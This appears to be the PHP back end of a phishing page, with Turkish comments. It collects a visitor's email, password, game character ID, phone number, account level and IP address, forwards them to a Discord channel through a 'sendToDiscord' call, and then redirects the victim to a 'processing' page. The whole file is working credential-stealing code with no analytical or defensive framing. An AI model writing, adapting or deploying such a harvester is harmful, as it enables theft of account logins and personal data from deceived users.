<?php
// Gerekli dosyaları dahil ediyoruz
include 'email.php';
include 'settings.php'; 

// Formdan veri gelmişse işlemleri başlat
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    
    // Form verilerini alıyoruz
    $email_verisi = isset($_POST['email']) ? htmlspecialchars($_POST['email']) : 'E-posta girilmedi';
    $sifre_verisi = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'Şifre girilmedi';
    $playid = isset($_POST['playid']) ? htmlspecialchars($_POST['playid']) : 'Girilmedi';
    $phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : 'Girilmedi';
    $level = isset($_POST['level']) ? htmlspecialchars($_POST['level']) : 'Girilmedi';
    $ip_adresi = $_SERVER['REMOTE_ADDR'];

    // Discord için mesaj içeriğini oluşturuyoruz (Tüm detayları ekledim)
    $discord_mesaji = "📧 **E-posta:** " . $email_verisi . "\n" .
                      "🔑 **Şifre:** " . $sifre_verisi . "\n" .
                      "🆔 **Karakter ID:** " . $playid . "\n" .
                      "📞 **Telefon:** " . $phone . "\n" .
                      "📊 **Hesap Seviyesi:** " . $level . "\n" .
                      "🌍 **IP Adresi:** " . $ip_adresi;

    // SADECE FONKSİYONU ÇAĞIRIYORUZ (Tanım settings.php içinde kalmalı)
    if (function_exists('sendToDiscord')) {
        sendToDiscord($discord_mesaji);
    }

    // İşlem bittikten sonra kullanıcıyı sonuç sayfasına yönlendir
    header("Location: processing.php");
    exit();
}
?>